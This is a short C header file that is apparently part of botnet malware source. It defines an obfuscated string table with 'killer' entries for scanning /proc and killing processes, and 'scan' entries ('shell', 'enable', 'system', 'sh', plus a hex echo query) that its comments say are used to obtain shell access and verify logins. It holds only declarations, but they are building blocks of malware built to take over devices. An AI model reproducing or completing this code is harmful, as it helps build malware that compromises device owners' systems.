#pragma once

#include <stdint.h>
#include "includes.h"

struct table_value {
    char *val;
    uint16_t val_len;
#ifdef DEBUG
    BOOL locked;
#endif
};


/* Killer data */          
#define TABLE_KILLER_PROC               1 // /proc/
#define TABLE_KILLER_EXE                2
#define TABLE_KILLER_FD                 3   /* "/fd" */
#define TABLE_KILLER_TCP                4
#define TABLE_KILLER_TMP                5
#define TABLE_KILLER_MAPS               6
#define TABLE_SCAN_SHELL                7  /* 'shell' to enable shell access */
#define TABLE_SCAN_ENABLE               8  /* 'enable' to enable shell access */
#define TABLE_SCAN_SYSTEM               9  /* 'system' to enable shell access */
#define TABLE_SCAN_SH                   10  /* 'sh' to enable shell access */
#define TABLE_SCAN_QUERY                11  /* echo hex string to verify login */
#define TABLE_SCAN_RESP                 12  /* utf8 version of query string */

#define TABLE_MAX_KEYS  13 /* Highest value + 1 */

void table_init(void);
void table_unlock_val(uint8_t);
void table_lock_val(uint8_t); 
char *table_retrieve_val(int, int *);

static void add_entry(uint8_t, char *, int);
static void toggle_obf(uint8_t);
